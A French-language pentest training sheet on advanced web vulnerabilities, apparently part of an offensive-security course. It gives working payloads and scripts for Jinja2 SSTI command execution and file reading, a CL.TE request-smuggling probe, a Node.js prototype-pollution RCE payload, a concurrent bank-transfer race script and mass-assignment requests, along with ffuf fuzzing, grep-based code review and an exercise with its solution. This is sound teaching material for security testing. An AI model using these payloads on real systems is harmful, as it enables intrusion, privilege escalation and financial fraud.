---
tags:
  - Cybersécurité
  - Avancé
  - Pratique
description: "Sécurité web avancée : vulnérabilités au-delà de l'OWASP Top 10, exploitation d'API, fuzzing"
estimated_time: "55 min"
fiche_number: 4
total_fiches: 5
cursus: "Phase 4 - Spécialisation Offensive"
---

# 04 - Sécurité Web Avancée

> **En bref** : À la fin de cette fiche, tu sauras identifier et exploiter des vulnérabilités web avancées au-delà de l'OWASP Top 10 (prototype pollution, race conditions, HTTP request smuggling, SSTI, deserialization), tester la sécurité des API REST, automatiser la recherche de vulnérabilités avec des outils de fuzzing et structurer une revue de code orientée sécurité. Lecture estimée : 55 min.


## Prérequis

- [Phase 3 - Fiche 02 : Sécurité Web et Applicative](../03-competences-intermediaires/02-securite-web-applicative.md) (OWASP Top 10, XSS, SQLi, CSRF)
- [01 - Méthodologie de Pentest](01-methodologie-pentest.md) (cette phase)
- Bonne maîtrise de HTTP/HTTPS (requêtes, réponses, en-têtes, cookies)
- Connaissance de base en JavaScript, Python et PHP
- Expérience avec Burp Suite (proxy, repeater, intruder)

## Objectif de cette fiche

À la fin de cette fiche, tu sauras identifier et exploiter des vulnérabilités web avancées au-delà de l'OWASP Top 10 (prototype pollution, race conditions, HTTP request smuggling, SSTI, deserialization), tester la sécurité des API REST, automatiser la recherche de vulnérabilités avec des outils de fuzzing et structurer une revue de code orientée sécurité.

---

## Concepts

### Qu'est-ce que la sécurité web avancée ?

**Définition** : La sécurité web avancée couvre les vulnérabilités qui dépassent les failles classiques de l'OWASP Top 10 : des attaques plus subtiles qui exploitent la logique applicative, les spécificités des protocoles ou les comportements imprévus des frameworks.

**Le problème que la sécurité web avancée résout** :

Sans connaissances avancées, voici les problèmes rencontrés :

1. **Vulnérabilités invisibles aux scanners** : Les outils automatisés (Burp Scanner, OWASP ZAP) ne détectent pas les race conditions, le request smuggling ou les failles de désérialisation.
2. **Faux sentiment de sécurité** : Une application "conforme OWASP Top 10" peut contenir des vulnérabilités critiques dans sa logique métier ou ses interactions avec l'infrastructure.
3. **API non testées** : Les API REST/GraphQL ont des surfaces d'attaque spécifiques (BOLA, mass assignment) que les tests web classiques ne couvrent pas.

**Comment la sécurité web avancée résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Vulnérabilités invisibles aux scanners | Tests manuels ciblés avec compréhension de la logique applicative |
| Faux sentiment de sécurité | Couverture étendue au-delà du Top 10, incluant les failles logiques |
| API non testées | Méthodologie dédiée aux API (OWASP API Security Top 10) |

**Analogie concrète** : L'OWASP Top 10, c'est vérifier que les portes et les fenêtres d'une maison sont verrouillées. La sécurité web avancée, c'est vérifier que le système de ventilation ne peut pas être utilisé pour entrer, que le voisin ne peut pas accéder à ta maison par un mur mitoyen mal isolé, et que le facteur ne peut pas ouvrir ta boîte aux lettres pour atteindre le mécanisme de la porte.

---

### Qu'est-ce que le Server-Side Template Injection (SSTI) ?

**Définition** : Le SSTI est une vulnérabilité où un attaquant injecte du code dans un template côté serveur (Jinja2, Twig, Freemarker, Velocity), qui est ensuite interprété et exécuté par le moteur de template.

**Le problème que le SSTI exploite** :

1. **Entrée utilisateur dans un template** : L'application insère une entrée utilisateur directement dans le code du template au lieu de la passer comme variable.
2. **Exécution de code côté serveur** : Les moteurs de template ont accès au runtime du langage (Python, PHP, Java), ce qui permet l'exécution de code arbitraire.

**Moteurs de template vulnérables et détection** :

| Moteur | Langage | Payload de détection | Résultat si vulnérable |
| ------ | ------- | -------------------- | ---------------------- |
| Jinja2 | Python | `{{7*7}}` | `49` |
| Twig | PHP | `{{7*7}}` | `49` |
| Freemarker | Java | `${7*7}` | `49` |
| Velocity | Java | `#set($x=7*7)$x` | `49` |
| ERB | Ruby | `<%= 7*7 %>` | `49` |
| Smarty | PHP | `{7*7}` | `49` |

**Ce que le SSTI n'est PAS** :

- Le SSTI n'est pas du XSS. Le XSS s'exécute dans le navigateur du client. Le SSTI s'exécute sur le serveur et peut mener à l'exécution de commandes système (RCE).
- Le SSTI n'est pas limité à l'affichage. Un payload SSTI peut lire des fichiers, exécuter des commandes, et compromettre le serveur entier.

---

### Qu'est-ce que le HTTP Request Smuggling ?

**Définition** : Le HTTP Request Smuggling exploite les différences d'interprétation des requêtes HTTP entre un proxy frontal (reverse proxy, CDN, load balancer) et le serveur backend, permettant d'injecter des requêtes supplémentaires.

**Le problème que le request smuggling exploite** :

1. **Ambiguïté du protocole HTTP** : Les en-têtes `Content-Length` et `Transfer-Encoding` peuvent indiquer des tailles différentes. Le proxy utilise l'un, le backend utilise l'autre.
2. **Chaîne de proxies** : Quand plusieurs serveurs traitent la même requête, chacun peut interpréter les limites de la requête différemment.

**Types de request smuggling** :

| Type | Proxy utilise | Backend utilise | Description |
| ---- | ------------- | --------------- | ----------- |
| CL.TE | Content-Length | Transfer-Encoding | Le proxy lit Content-Length, le backend lit Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length | Le proxy lit Transfer-Encoding, le backend lit Content-Length |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Les deux utilisent Transfer-Encoding mais l'un est trompé par une variante obfusquée |

**Analogie concrète** : Imagine deux gardes à l'entrée d'un bâtiment. Le premier garde (proxy) compte les personnes par leur taille (Content-Length), le deuxième (backend) les compte par groupes (Transfer-Encoding). Tu envoies un groupe de 3 personnes, mais tu fais croire au premier garde qu'il n'y en a que 2. La troisième personne passe le premier contrôle et se retrouve "smugglée" dans la requête suivante, vue par le backend comme une requête légitime indépendante.

---

### Qu'est-ce que la Prototype Pollution ?

**Définition** : La prototype pollution est une vulnérabilité JavaScript qui permet à un attaquant de modifier le prototype d'un objet de base (`Object.prototype`), affectant ainsi tous les objets de l'application.

**Le problème que la prototype pollution exploite** :

1. **Héritage prototypal JavaScript** : En JavaScript, tous les objets héritent de `Object.prototype`. Modifier ce prototype affecte _tous_ les objets existants et futurs.
2. **Fusion récursive non sécurisée** : Les fonctions `merge()`, `extend()` ou `defaultsDeep()` qui fusionnent des objets sans vérifier les clés spéciales (`__proto__`, `constructor`, `prototype`).

**Impact potentiel** :

| Impact | Comment |
| ------ | ------- |
| XSS | Injection de propriétés utilisées dans le DOM (innerHTML, src) |
| Bypass d'authentification | Modification de `isAdmin` ou `role` sur le prototype |
| Déni de service | Modification de propriétés critiques causant des crashes |
| RCE (côté serveur) | Pollution de propriétés utilisées par `child_process` ou `vm` dans Node.js |

---

### Qu'est-ce qu'une Race Condition ?

**Définition** : Une race condition (condition de concurrence) est une vulnérabilité qui survient quand le résultat d'une opération dépend de l'ordre d'exécution de deux ou plusieurs opérations concurrentes, et qu'un attaquant peut manipuler cet ordre.

**Le problème que la race condition exploite** :

1. **Vérification puis utilisation** (TOCTOU - Time of Check to Time of Use) : L'application vérifie une condition (solde suffisant, code promo non utilisé) puis effectue l'action, mais entre les deux un attaquant modifie l'état.
2. **Absence de verrouillage** : Les opérations critiques ne sont pas protégées par un mutex ou une transaction atomique.

**Exemples courants** :

| Scénario | Exploitation |
| -------- | ------------ |
| Double retrait bancaire | Envoyer 2 requêtes de retrait simultanément avant que le solde ne soit mis à jour |
| Code promo réutilisé | Appliquer le même code promo en parallèle sur 2 paniers |
| Upload de fichier + vérification | Uploader un fichier malveillant et y accéder avant que le scan antivirus ne le supprime |
| Inscription simultanée | Créer 2 comptes avec le même e-mail en parallèle pour contourner l'unicité |

---

### Qu'est-ce que la désérialisation non sécurisée ?

**Définition** : La désérialisation non sécurisée (insecure deserialization) est une vulnérabilité où une application désérialise des données contrôlées par l'attaquant sans validation, permettant l'exécution de code arbitraire, l'injection d'objets ou la manipulation de la logique applicative.

**Chaînes de désérialisation par langage** :

| Langage | Format courant | Outil de génération | Exemple de chaîne |
| ------- | -------------- | ------------------- | ----------------- |
| Java | ObjectInputStream | ysoserial | CommonsCollections, Spring, Hibernate |
| PHP | serialize/unserialize | phpggc | Monolog, Laravel, Symfony |
| Python | pickle | pickle-payload | os.system, subprocess |
| .NET | BinaryFormatter, JSON.NET | ysoserial.net | TypeNameHandling, ObjectDataProvider |
| Ruby | Marshal | - | ERB template exécution |

**Ce que la désérialisation non sécurisée n'est PAS** :

- Ce n'est pas une injection SQL ou une injection de commande directe. L'attaquant ne tape pas de commande : il forge un objet sérialisé qui, lors de sa désérialisation, déclenche une chaîne d'appels menant à l'exécution de code.
- Ce n'est pas toujours exploitable. Il faut qu'une "gadget chain" (chaîne de classes) soit disponible dans les bibliothèques chargées par l'application.

---

### Qu'est-ce que la sécurité des API ?

**Définition** : La sécurité des API couvre les vulnérabilités spécifiques aux interfaces de programmation (REST, GraphQL, gRPC) qui exposent des fonctionnalités et des données via des endpoints structurés.

**OWASP API Security Top 10 (2023)** :

| # | Vulnérabilité | Description |
| - | ------------- | ----------- |
| API1 | Broken Object Level Authorization (BOLA) | Accès à des objets d'autres utilisateurs en modifiant l'ID |
| API2 | Broken Authentication | Faiblesses dans le mécanisme d'authentification (tokens, sessions) |
| API3 | Broken Object Property Level Authorization | Accès ou modification de propriétés non autorisées (mass assignment) |
| API4 | Unrestricted Resource Consumption | Absence de rate limiting, consommation excessive de ressources |
| API5 | Broken Function Level Authorization | Accès à des fonctions admin via des endpoints non protégés |
| API6 | Unrestricted Access to Sensitive Business Flows | Abus de flux métier (achat automatisé, spam) |
| API7 | Server Side Request Forgery (SSRF) | L'API effectue des requêtes vers des ressources internes |
| API8 | Security Misconfiguration | En-têtes manquants, CORS permissif, messages d'erreur verbeux |
| API9 | Improper Inventory Management | Endpoints legacy ou non documentés toujours accessibles |
| API10 | Unsafe Consumption of APIs | L'application fait confiance aveuglément aux données d'APIs tierces |

---

## Étapes Pratiques

### Étape 1 : Détecter et exploiter un SSTI

```bash
# === Détection ===
# Tester l'injection dans un paramètre (ici "name")
# Envoyer des payloads de détection pour identifier le moteur de template

# Payload universel de détection
curl -s "https://target.com/page?name={{7*7}}"
# Si la réponse contient "49", le moteur interprète le template

# Identifier le moteur avec des payloads spécifiques
# Jinja2 (Python) :
curl -s "https://target.com/page?name={{config}}"
# Si la config Flask/Django apparaît -> Jinja2

# Twig (PHP) :
curl -s "https://target.com/page?name={{app.request.server.all|join(',')}}"

# === Exploitation Jinja2 (Python) ===
# Lire un fichier
curl -s "https://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read()}}"

# Exécution de commande (via la classe Popen)
# Trouver l'index de subprocess.Popen dans __subclasses__
curl -s "https://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()}}" | tr ',' '\n' | grep -n Popen

# Exécuter la commande (X = index trouvé)
curl -s "https://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()[X](['id'],stdout=-1).communicate()[0]}}"
```

**Résultat attendu** :

```text
# Détection :
Hello 49!
# -> Le moteur de template interprète {{7*7}} = vulnérable

# Exécution de commande :
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)!
# -> RCE confirmé via SSTI Jinja2
```

---

### Étape 2 : Détecter et exploiter un HTTP Request Smuggling

```bash
# === Détection avec Burp Suite ===
# Utiliser l'extension "HTTP Request Smuggler" de Burp Suite
# ou tester manuellement avec curl

# Test CL.TE (Content-Length lu par le proxy, Transfer-Encoding par le backend)
# Envoyer une requête avec les deux en-têtes
# Le proxy lit Content-Length: 13 (tout le body)
# Le backend lit Transfer-Encoding: chunked et s'arrête au "0"
# Les octets restants ("SMUGGLED") sont traités comme le début
# de la requête suivante

# Requête de test (à envoyer via Burp Repeater, pas curl) :
# POST / HTTP/1.1
# Host: target.com
# Content-Length: 35
# Transfer-Encoding: chunked
#
# 0
#
# GET /admin HTTP/1.1
# X-Ignore: X
```

Voici un script Python pour automatiser la détection :

```python
#!/usr/bin/env python3
"""
Détection basique de HTTP Request Smuggling (CL.TE).
Envoie une requête ambiguë et vérifie la réponse.
"""

import socket
import ssl

def test_clte(host, port=443):
    """Teste la vulnérabilité CL.TE."""
    # Requête de détection : si le backend interprète
    # Transfer-Encoding, la requête smugglée provoquera
    # un timeout ou une erreur différente
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"Q"  # Ce 'Q' sera interprété différemment
    )

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    wrapped = context.wrap_socket(sock, server_hostname=host)
    wrapped.connect((host, port))
    wrapped.send(payload.encode())

    try:
        response = wrapped.recv(4096).decode()
        print(f"[*] Réponse reçue ({len(response)} octets)")
        print(response[:200])
    except socket.timeout:
        print("[!] Timeout - possible CL.TE smuggling")
    finally:
        wrapped.close()

if __name__ == "__main__":
    test_clte("target.com")
```

**Résultat attendu** :

```text
# Si vulnérable, la requête smugglée affecte la requête suivante :
# Le prochain utilisateur qui visite le site reçoit une réponse
# différente (redirection vers /admin, erreur 405, etc.)
[!] Timeout - possible CL.TE smuggling
```

---

### Étape 3 : Exploiter une Prototype Pollution

```javascript
// === Détection ===
// Tester si l'application utilise une fusion d'objets non sécurisée

// Payload classique via JSON body
// POST /api/user/settings HTTP/1.1
// Content-Type: application/json
//
// {"__proto__": {"isAdmin": true}}

// Ou via paramètre URL
// GET /api/search?__proto__[isAdmin]=true

// === Exploitation côté serveur (Node.js) ===
// Si l'application utilise child_process.execSync ou spawn
// et que les options sont fusionnées avec les defaults :

// Payload pour RCE via child_process.fork
// POST /api/settings HTTP/1.1
// Content-Type: application/json
//
// {
//   "__proto__": {
//     "shell": "/proc/self/exe",
//     "argv0": "console.log(require('child_process').execSync('id').toString())",
//     "NODE_OPTIONS": "--require /proc/self/cmdline"
//   }
// }

// === Vérification ===
// Après le payload, vérifier si la propriété est héritée
// GET /api/user/profile HTTP/1.1
// Réponse : {"name": "test", "isAdmin": true}
// isAdmin n'existait pas sur l'objet user mais est hérité du prototype
```

**Résultat attendu** :

```text
# Avant le payload :
GET /api/user/profile -> {"name": "test", "role": "user"}

# Après le payload __proto__.isAdmin = true :
GET /api/user/profile -> {"name": "test", "role": "user", "isAdmin": true}

# L'utilisateur a maintenant des privilèges admin
# via la pollution du prototype Object
```

---

### Étape 4 : Exploiter une Race Condition

```python
#!/usr/bin/env python3
"""
Exploitation d'une race condition sur un endpoint de transfert bancaire.
Envoie N requêtes simultanées pour tenter un double retrait.
"""

import asyncio
import aiohttp

TARGET = "https://target.com/api/transfer"
HEADERS = {
    "Cookie": "session=abc123",
    "Content-Type": "application/json"
}
PAYLOAD = {
    "to": "attacker_account",
    "amount": 1000
}

async def send_request(session, request_id):
    """Envoie une requête de transfert."""
    async with session.post(TARGET, json=PAYLOAD, headers=HEADERS) as resp:
        status = resp.status
        body = await resp.text()
        print(f"[{request_id}] Status: {status} - {body[:80]}")

async def main():
    """Lance 20 requêtes simultanées."""
    async with aiohttp.ClientSession() as session:
        # Créer 20 tâches simultanées
        tasks = [send_request(session, i) for i in range(20)]
        # Les lancer toutes en même temps
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("[*] Lancement de 20 requêtes simultanées...")
    asyncio.run(main())
```

Alternative avec Burp Suite (plus simple) :

```text
1. Capturer la requête de transfert dans Burp Proxy
2. Envoyer la requête dans Turbo Intruder (extension Burp)
3. Utiliser le script "race-single-packet-attack.py"
4. Ce script envoie toutes les requêtes dans un seul paquet TCP
   pour maximiser la simultanéité
5. Vérifier le solde après les requêtes
```

**Résultat attendu** :

```text
[*] Lancement de 20 requêtes simultanées...
[0] Status: 200 - {"success": true, "balance": 9000}
[1] Status: 200 - {"success": true, "balance": 8000}
[2] Status: 200 - {"success": true, "balance": 7000}
[3] Status: 400 - {"error": "Insufficient funds"}
...

# Solde initial : 10 000
# 3 transferts de 1 000 ont réussi au lieu d'1 seul
# -> Race condition confirmée, le solde a été débité 3 fois
```

---

### Étape 5 : Tester la sécurité d'une API REST

```bash
# === Détection BOLA (Broken Object Level Authorization) ===
# Se connecter en tant qu'utilisateur A et tenter d'accéder
# aux ressources de l'utilisateur B en modifiant l'ID

# Requête légitime (utilisateur A, ID=1)
curl -s -H "Authorization: Bearer TOKEN_USER_A" \
  "https://api.target.com/api/users/1/orders"

# Tenter d'accéder aux commandes de l'utilisateur B (ID=2)
curl -s -H "Authorization: Bearer TOKEN_USER_A" \
  "https://api.target.com/api/users/2/orders"

# Si la réponse contient les commandes de l'utilisateur B -> BOLA

# === Détection Mass Assignment ===
# Envoyer des propriétés non prévues dans une requête de mise à jour
curl -s -X PUT -H "Authorization: Bearer TOKEN_USER_A" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "role": "admin", "is_verified": true}' \
  "https://api.target.com/api/users/1"

# Si le rôle change -> Mass Assignment

# === Énumération d'endpoints ===
# Fuzzer les endpoints de l'API
ffuf -u "https://api.target.com/api/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,301,302,403

# Fuzzer les versions de l'API
ffuf -u "https://api.target.com/FUZZ/users" \
  -w <(printf "api\napi/v1\napi/v2\napi/v3\napi/internal\napi/admin\napi/debug") \
  -mc 200,201,301,302

# === Fuzzing de paramètres ===
# Tester des paramètres cachés
ffuf -u "https://api.target.com/api/users?FUZZ=true" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200 -fs 1234
```

**Résultat attendu** :

```text
# BOLA détecté :
$ curl -s -H "Authorization: Bearer TOKEN_USER_A" "https://api.target.com/api/users/2/orders"
{"orders": [{"id": 501, "product": "Laptop", "amount": 1299.99}, ...]}
# -> On accède aux commandes de l'utilisateur 2 avec le token de l'utilisateur 1

# Mass Assignment détecté :
$ curl -s -X PUT ... -d '{"name": "Test", "role": "admin"}'
{"id": 1, "name": "Test", "role": "admin", "is_verified": true}
# -> Le rôle a été modifié en "admin"
```

---

### Étape 6 : Automatiser le fuzzing avec ffuf

```bash
# === Fuzzing de répertoires ===
ffuf -u "https://target.com/FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 \
  -o ffuf_dirs.json -of json

# === Fuzzing de sous-domaines ===
ffuf -u "https://FUZZ.target.com" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200 -fs 0

# === Fuzzing de paramètres GET ===
ffuf -u "https://target.com/search?FUZZ=test" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -fs 4523

# === Fuzzing de valeurs (brute force d'ID) ===
ffuf -u "https://target.com/api/users/FUZZ" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200

# === Fuzzing avec filtrage avancé ===
# -fc : filtrer les codes de réponse
# -fs : filtrer par taille de réponse
# -fw : filtrer par nombre de mots
# -fl : filtrer par nombre de lignes
# -ft : filtrer par temps de réponse
ffuf -u "https://target.com/FUZZ" \
  -w wordlist.txt \
  -mc all \
  -fc 404 \
  -fs 1234 \
  -t 50 \
  -rate 100
```

**Résultat attendu** :

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

[Status: 200, Size: 4523, Words: 234, Lines: 56, Duration: 45ms]
    * FUZZ: admin

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 32ms]
    * FUZZ: backup

[Status: 403, Size: 278, Words: 20, Lines: 7, Duration: 28ms]
    * FUZZ: config

[Status: 200, Size: 892, Words: 45, Lines: 12, Duration: 51ms]
    * FUZZ: api

:: Progress: [30000/30000] :: Job [1/1] :: 100 req/sec :: Errors: 0 ::
```

---

### Étape 7 : Mener une revue de code orientée sécurité

```bash
# === Recherche de patterns vulnérables ===

# PHP : rechercher les fonctions dangereuses
grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" --include="*.php" ./src/

# PHP : rechercher les requêtes SQL non préparées
grep -rn "query\|execute" --include="*.php" ./src/ | grep -v "prepare"

# PHP : rechercher les désérialisations
grep -rn "unserialize" --include="*.php" ./src/

# Python : rechercher les imports dangereux
grep -rn "pickle\|yaml.load\|eval\|exec\|subprocess\|os.system" --include="*.py" ./src/

# Python : rechercher les SSTI potentiels
grep -rn "render_template_string\|Template(" --include="*.py" ./src/

# JavaScript/Node.js : rechercher les patterns vulnérables
grep -rn "eval\|Function(\|child_process\|vm.runIn" --include="*.js" ./src/

# JavaScript : rechercher les fusions d'objets (prototype pollution)
grep -rn "merge\|extend\|defaultsDeep\|_.assign" --include="*.js" ./src/

# Java : rechercher les désérialisations
grep -rn "ObjectInputStream\|readObject\|XMLDecoder\|fromXML" --include="*.java" ./src/

# Rechercher les secrets hardcodés
grep -rn "password\|secret\|api_key\|token\|private_key" --include="*.py" --include="*.js" --include="*.php" ./src/ | grep -i "=\|:"
```

**Résultat attendu** :

```text
# Exemples de résultats nécessitant une investigation :
src/controllers/UserController.php:45: $result = $db->query("SELECT * FROM users WHERE id=" . $_GET['id']);
-> SQLi : concaténation directe de l'entrée utilisateur

src/utils/template.py:12: return render_template_string(request.args.get('template'))
-> SSTI : entrée utilisateur dans render_template_string

src/api/merge.js:8: _.merge(config, req.body);
-> Prototype Pollution : fusion non filtrée avec l'entrée utilisateur

src/config/database.php:3: $password = "SuperSecret123";
-> Secret hardcodé dans le code source
```

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `ffuf -u URL/FUZZ -w wordlist` | Fuzzing de répertoires/endpoints |
| `ffuf -u FUZZ.domain -w subdomains.txt` | Fuzzing de sous-domaines |
| `curl -s URL -H "Content-Type: application/json" -d '{}'` | Tester un endpoint API |
| `wfuzz -u URL/FUZZ -w wordlist --hc 404` | Fuzzing web alternatif |
| `sqlmap -u "URL?param=1" --batch` | Test automatisé d'injection SQL |
| `tplmap -u "URL?param=*"` | Détection automatisée de SSTI |
| `phpggc -l` | Lister les chaînes de désérialisation PHP disponibles |
| `ysoserial -l` | Lister les chaînes de désérialisation Java disponibles |
| `nuclei -u URL -t cves/` | Scan de vulnérabilités avec Nuclei |
| `arjun -u URL` | Découverte de paramètres cachés |

---

## Pièges Fréquents

### Piège 1 : Tester le SSTI avec un payload destructeur

**Problème** : Tu testes un SSTI avec `{{config}}` ou `{{''.__class__.__mro__[1].__subclasses__()}}` sur un serveur de production. Le payload retourne des centaines de lignes et ralentit le serveur.

**Solution** : Commence toujours par un payload de détection non destructeur : `{{7*7}}`. Si le résultat est `49`, tu as confirmé le SSTI. Ensuite, utilise des payloads ciblés et légers. Ne lance jamais de commande système destructrice (`rm`, `shutdown`).

---

### Piège 2 : Ignorer les protections côté client pour les API

**Problème** : Tu ne testes que via l'interface web. L'application masque les champs `role` et `isAdmin` dans le formulaire, mais l'API les accepte. Tu passes à côté d'un mass assignment.

**Solution** : Toujours tester les API directement avec Burp Suite ou curl, indépendamment de l'interface web. Ajoute des propriétés supplémentaires dans chaque requête POST/PUT pour détecter le mass assignment.

---

### Piège 3 : Confondre XSS et SSTI

**Problème** : Tu injectes `<script>alert(1)</script>` dans un champ et obtiens une alerte. Tu documentes un XSS. Mais en réalité, le moteur de template interprète aussi les expressions : tu passes à côté d'un SSTI (RCE sur le serveur).

**Solution** : Teste toujours les deux. Si `<script>alert(1)</script>` fonctionne (XSS), teste aussi `{{7*7}}`. Un SSTI est presque toujours plus critique qu'un XSS car il permet l'exécution de code sur le serveur.

---

### Piège 4 : Fuzzer sans filtrer les résultats

**Problème** : Tu lances ffuf avec 100 000 mots et obtiens 50 000 résultats avec le code 200. Impossible d'identifier les vrais positifs.

**Solution** : Lance d'abord une requête avec un mot qui n'existe pas (ex: `aaaaaa`) pour voir la taille de réponse par défaut. Utilise `-fs` pour filtrer cette taille. Utilise aussi `-fc` pour filtrer les codes non pertinents et `-ft` pour les réponses trop lentes (timeout).

---

### Piège 5 : Ne pas tester les anciennes versions de l'API

**Problème** : L'API v2 est sécurisée avec authentification et contrôle d'accès. Mais l'API v1 est toujours accessible à `/api/v1/` sans aucune protection. Tu ne l'as pas testée.

**Solution** : Toujours fuzzer les versions de l'API (`/api/v1/`, `/api/v2/`, `/api/internal/`, `/api/admin/`). Les anciennes versions sont souvent oubliées lors des mises à jour de sécurité.

---

## Checklist de Validation

- [ ] Je sais détecter un SSTI avec le payload `{{7*7}}` et identifier le moteur de template
- [ ] Je comprends le HTTP Request Smuggling (CL.TE, TE.CL) et ses impacts
- [ ] Je sais exploiter une prototype pollution en JavaScript
- [ ] Je sais tester une race condition avec des requêtes simultanées
- [ ] Je comprends la désérialisation non sécurisée et les gadget chains
- [ ] Je sais tester les vulnérabilités API (BOLA, mass assignment, rate limiting)
- [ ] Je sais utiliser ffuf pour le fuzzing de répertoires, sous-domaines et paramètres
- [ ] Je sais mener une revue de code orientée sécurité (patterns vulnérables par langage)
- [ ] Je sais filtrer les résultats de fuzzing pour identifier les vrais positifs
- [ ] Je documente chaque vulnérabilité avec preuve, impact et recommandation

---

## Exercice Pratique

**Énoncé** : Tu réalises un test d'intrusion sur une application web avec une API REST. L'application est un e-commerce avec :

- Front-end : `https://shop.target.com`
- API : `https://api.target.com/v2/`
- Compte test : `testuser / TestP@ss2026`
- Fonctionnalités : catalogue produits, panier, commandes, profil utilisateur

**Tâches** :

1. Fuzzer l'API pour découvrir les endpoints cachés
2. Tester chaque endpoint pour BOLA (modifier les ID)
3. Tester le mass assignment sur la mise à jour du profil
4. Tester une race condition sur l'application d'un code promo
5. Chercher un SSTI dans les fonctionnalités qui affichent du contenu dynamique (recherche, profil)
6. Documenter les vulnérabilités trouvées

**Indications** :

- Commence par le fuzzing des endpoints avec ffuf
- Pour BOLA, compare les réponses avec ton ID et un autre ID
- Pour le mass assignment, ajoute `"role": "admin"` dans le PUT du profil
- Pour la race condition, utilise le script Python async ou Burp Turbo Intruder
- Pour le SSTI, teste `{{7*7}}` dans tous les champs de texte

**Résultat attendu** : Un rapport avec les endpoints découverts, les vulnérabilités identifiées (preuve, impact, recommandation) et les scripts d'exploitation.

**Plateformes d'entraînement** :

- PortSwigger Web Security Academy (labs gratuits pour chaque vulnérabilité)
- Hack The Box : machines web (Awkward, Pollution, Shoppy)
- OWASP WebGoat et Juice Shop

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

**1. Fuzzing des endpoints** :

```bash
ffuf -u "https://api.target.com/v2/FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,301,403

# Résultats :
# /v2/users    -> 200 (liste des utilisateurs)
# /v2/orders   -> 200 (liste des commandes)
# /v2/products -> 200 (catalogue)
# /v2/admin    -> 403 (panel admin, accès refusé)
# /v2/promo    -> 200 (codes promo)
# /v2/debug    -> 200 (endpoint de debug non documenté)
```

**2. Test BOLA** :

```bash
# Mon profil (ID=1)
curl -s -H "Authorization: Bearer TOKEN" "https://api.target.com/v2/users/1"
# {"id": 1, "name": "testuser", "email": "test@example.com"}

# Profil d'un autre utilisateur (ID=2)
curl -s -H "Authorization: Bearer TOKEN" "https://api.target.com/v2/users/2"
# {"id": 2, "name": "admin", "email": "admin@target.com", "role": "admin"}
# -> BOLA confirmé : on accède aux données d'un autre utilisateur
```

**3. Test Mass Assignment** :

```bash
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "testuser", "role": "admin"}' \
  "https://api.target.com/v2/users/1"
# {"id": 1, "name": "testuser", "role": "admin"}
# -> Mass Assignment confirmé : le rôle a été modifié en admin
```

**4. Test Race Condition** :

```bash
# Utiliser le script Python async avec le code promo "PROMO50"
# Résultat : le code promo a été appliqué 3 fois au lieu d'1
# Réduction totale : 150 EUR au lieu de 50 EUR
```

**5. Test SSTI** :

```bash
# Tester dans le champ de recherche
curl -s "https://shop.target.com/search?q={{7*7}}"
# La page de résultats affiche "Résultats pour : 49"
# -> SSTI confirmé

# Identifier le moteur : Jinja2 (Python)
curl -s "https://shop.target.com/search?q={{config.items()}}"
# -> Configuration Flask visible
```

---

## Navigation

← Fiche précédente : **[03 - Active Directory - Attaque et Sécurisation](03-active-directory.md)**

→ Fiche suivante : **[05 - Certifications Offensives - Guide et Préparation](05-certifications-offensives.md)**
